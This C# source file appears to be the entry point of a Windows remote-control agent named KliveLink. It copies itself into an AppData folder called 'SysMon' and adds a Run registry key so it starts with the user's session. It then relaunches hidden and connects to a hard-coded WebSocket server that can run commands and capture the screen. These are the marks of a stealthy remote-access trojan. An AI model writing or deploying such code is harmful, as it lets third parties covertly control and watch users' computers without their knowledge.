using System.Drawing;
using KliveLink.Agent;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using Microsoft.Win32;
using System.Linq;

namespace KliveLink
{

    internal static class Program
    {
        private const string DefaultServerUri = "ws://klive.dev:5100/klivelink";
        private static NotifyIcon? _trayIcon;
        private static KliveLinkClient? _client;

        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            // Move app to AppData and set auto-start if first launch
            string currentPath = Environment.ProcessPath!;
            string targetDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SysMon");
            string targetPath = Path.Combine(targetDir, Path.GetFileName(currentPath));
            if (currentPath != targetPath)
            {
                if (!Directory.Exists(targetDir)) Directory.CreateDirectory(targetDir);
                string sourceDir = Path.GetDirectoryName(currentPath);
                foreach (string file in Directory.GetFiles(sourceDir))
                {
                    string destFile = Path.Combine(targetDir, Path.GetFileName(file));
                    File.Copy(file, destFile, true);
                }
                // Set auto-start
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    if (key != null)
                    {
                        key.SetValue("KL", targetPath);
                    }
                }
                // Launch new instance invisibly
                Process.Start(new ProcessStartInfo
                {
                    FileName = targetPath,
                    Arguments = string.Join(" ", args.Select(arg => $"\"{arg}\"")),
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                return;
            }

            // Parse arguments
            string serverUri = DefaultServerUri;
            string authToken = "";
            string agentId = Environment.MachineName + "-" + Environment.UserName;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i].ToLower())
                {
                    case "--server" when i + 1 < args.Length:
                        serverUri = args[++i];
                        break;
                    case "--token" when i + 1 < args.Length:
                        authToken = args[++i];
                        break;
                    case "--agentid" when i + 1 < args.Length:
                        agentId = args[++i];
                        break;
                }
            }

            // Step 3: Start the WebSocket client on a background thread
            var executor = new CommandExecutor();
            var screenCapture = new ScreenCaptureService();
            _client = new KliveLinkClient(serverUri, agentId, authToken, executor, screenCapture);
            _client.OnLog += (msg) => Console.WriteLine(msg);

            var cts = new CancellationTokenSource();
            _ = Task.Run(() => _client.ConnectAsync(cts.Token));

            // Step 4: Run the WinForms message loop (keeps tray icon alive)
            Application.Run();

            // Cleanup
            cts.Cancel();
            _client.Dispose();
            _trayIcon?.Dispose();
        }
    }
}
